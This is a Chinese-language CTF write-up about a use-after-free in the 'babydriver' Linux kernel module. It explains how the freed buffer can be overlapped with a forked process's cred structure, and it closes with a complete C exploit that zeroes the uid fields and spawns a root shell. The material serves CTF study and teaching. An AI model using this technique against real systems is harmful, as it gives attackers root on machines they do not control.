---
title: kernel_uaf
date: 2022-02-13 00:09:12
permalink: /pages/def829/
categories:
  - ctf_wp
  - kernel
tags:
  - 
---
# kernel uaf 

[[toc]]

## 分析

解包得到babydriver.ko文件，

这里其实有点奇怪，关于驱动文件我们要明白，他是常驻内核态的， 我们的程序打开这个文件描述符和读写关闭等操作会转入到这个驱动对应的函数内，我们编写用户态程序进行操作，其实是类似于我们直接去调用这些函数的。其中对应关系， 

> 具体的关系一般要查看 data段的 file_operations， 这里说下一般遇到的常见命名方式。

* open("driver_name", flag) => Xopen 
* Write => Xwrite 
* read => Xread 
* Ioctl => Xioctl
* close(fd) => Xrelease 

然后载入和卸载驱动会自动调用 `init` `exit`两个函数。

## 漏洞

简单分析几个函数， 发现这个驱动主要使用了一个`babydevice_t`结构体， 其中保存起点和长度，

![image-20220213151649156](https://s2.loli.net/2022/02/13/ZxOEAaYkSBt9yRz.png)

可以通过read和write进行读写， 

通过ioctl可以实现重设大小， 

![image-20220213151737140](https://s2.loli.net/2022/02/13/I9YRsoZdtf1TDij.png)

每次open都会设置下这个全局变量。

![image-20220213151824489](https://s2.loli.net/2022/02/13/WZIm2Ytsze8hS5T.png)

close的时候将这个buf free掉， 但是没有清除全局变量，存在一个uaf 

> 我们可以同时打开两次， 两次共享这个全局变量， 其中一个关闭的时候，通过另一个就可以实现uaf的操作

![image-20220213151904695](https://s2.loli.net/2022/02/13/Lw1KCZlEjTPxSQO.png)

## 利用

uaf的利用思路就是堆块再次使用，进行复写。 

### struct cred 

这里介绍一个提权手段，linux下进程的权限管理是通过cred结构体实现的，定义如下：

```c
// include/linux/cred.h
/*
 * The security context of a task
 *
 * The parts of the context break down into two categories:
 *
 *  (1) The objective context of a task.  These parts are used when some other
 *      task is attempting to affect this one.
 *
 *  (2) The subjective context.  These details are used when the task is acting
 *      upon another object, be that a file, a task, a key or whatever.
 *
 * Note that some members of this structure belong to both categories - the
 * LSM security pointer for instance.
 *
 * A task has two security pointers.  task->real_cred points to the objective
 * context that defines that task's actual details.  The objective part of this
 * context is used whenever that task is acted upon.
 *
 * task->cred points to the subjective context that defines the details of how
 * that task is going to act upon another object.  This may be overridden
 * temporarily to point to another security context, but normally points to the
 * same context as task->real_cred.
 */
struct cred {
        atomic_t        usage;
#ifdef CONFIG_DEBUG_CREDENTIALS
        atomic_t        subscribers;    /* number of processes subscribed */
        void            *put_addr;
        unsigned        magic;
#define CRED_MAGIC      0x43736564
#define CRED_MAGIC_DEAD 0x44656144
#endif
        kuid_t          uid;            /* real UID of the task */
        kgid_t          gid;            /* real GID of the task */
        kuid_t          suid;           /* saved UID of the task */
        kgid_t          sgid;           /* saved GID of the task */
        kuid_t          euid;           /* effective UID of the task */
        kgid_t          egid;           /* effective GID of the task */
        kuid_t          fsuid;          /* UID for VFS ops */
        kgid_t          fsgid;          /* GID for VFS ops */
        unsigned        securebits;     /* SUID-less security management */
        kernel_cap_t    cap_inheritable; /* caps our children can inherit */
        kernel_cap_t    cap_permitted;  /* caps we're permitted */
        kernel_cap_t    cap_effective;  /* caps we can actually use */
        kernel_cap_t    cap_bset;       /* capability bounding set */
        kernel_cap_t    cap_ambient;    /* Ambient capability set */
#ifdef CONFIG_KEYS
        unsigned char   jit_keyring;    /* default keyring to attach requested
                                         * keys to */
        struct key __rcu *session_keyring; /* keyring inherited over fork */
        struct key      *process_keyring; /* keyring private to this process */
        struct key      *thread_keyring; /* keyring private to this thread */
        struct key      *request_key_auth; /* assumed request_key authority */
#endif
#ifdef CONFIG_SECURITY
        void            *security;      /* subjective LSM security */
#endif
        struct user_struct *user;       /* real user ID subscription */
        struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */
        struct group_info *group_info;  /* supplementary groups for euid/fsgid */
        struct rcu_head rcu;            /* RCU deletion hook */
};
```

其中uid和gid是当前使用的， suid/sgid其实是为了可能存在的uid-euid gid-egid互换准备的缓存位置，在信号 ipc共享内存等位置校验的其实是euid/egid， fuid/fgid是为了文件访问准备的，但是一般会随着euid/egid更改， 而且在其他的unix实现中其实这个访问校验也是通过euid/egid实现的。

其实linux下所有程序都是通过父进程fork得来的，因此也形成了一个进程树结构，fork是从父进程产生新进程出来， 其中这个新进程的权限控制的cred结构体生成的调用链如下：

```
kernel/fork.c: _do_fork
	-> copy_process 
		-> kernel/cred.c: copy_cred
			-> prepare_cred
```

然后我们确定下 在对应版本 4.4.7， 这个结构体的大小和偏移量：

![image-20220213145544095](https://s2.loli.net/2022/02/13/ajKYQFVwfovxhSX.png)

![image-20220213160815926](https://s2.loli.net/2022/02/13/QUuTv4gb2P5lAqa.png)

因为要修改euid和egid， 我们计算下到fsuid的距离。

![image-20220213160922647](https://s2.loli.net/2022/02/13/phuLzkwqHfIxtO6.png)

### uaf利用

首先open两次，通过ioctl修改chunk大小，使其和 cred结构体大小相同，

然后close一个让其free， 可以通过fd2实现uaf， 

进行fork， 这时候会创建相关的结构体， 其中就包含cred， 这时候应该会在uaf的buf得到这个结构体, 

> 0x3e8就是1000， 即普通用户权限的uid

![image-20220213161326854](https://s2.loli.net/2022/02/13/UA1jyEmt4CwzuxW.png)

然后我们直接使用write可以修改这个内存，将其前0x1c个大小修改为0， 即从uid到euid全部设为0， 即root权限

![image-20220213161456476](/Users/wlz/Library/Application%20Support/typora-user-images/image-20220213161456476.png)

此时子进程已经拿到了root权限，

![image-20220213161520985](https://s2.loli.net/2022/02/13/ABxztEuwio8Orhj.png)



### exp

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>

int main(){
    int fd1 = open("/dev/babydev", O_RDWR);
    if (fd1 < 0){
        printf("open fd1 error\n");
        exit(-1);
    }
    printf("open 1 success!\n");
    int fd2 = open("/dev/babydev", O_RDWR);
    if (fd2 < 0){
        printf("open fd2 error\n");
        exit(-1);
    }
    printf("open 2 success!\n");

    ioctl(fd1, 0x10001, 0xa8);
    printf("set struct cred size\n");

    close(fd1);
    printf("close fd1, free 0xa8\n");

    if (fork() == 0){
        printf("fork!");
        int size = 0x1c;
        char buf[size];
        memset(buf, 0, size);
        write(fd2, buf, size);
        printf("write !");
        if (getuid() == 0){
            system("/bin/sh");
        }
        return 0;
    } else {
        printf("hello world\n");
         waitpid(-1, NULL, 0);
    }
    return 0;
}
```

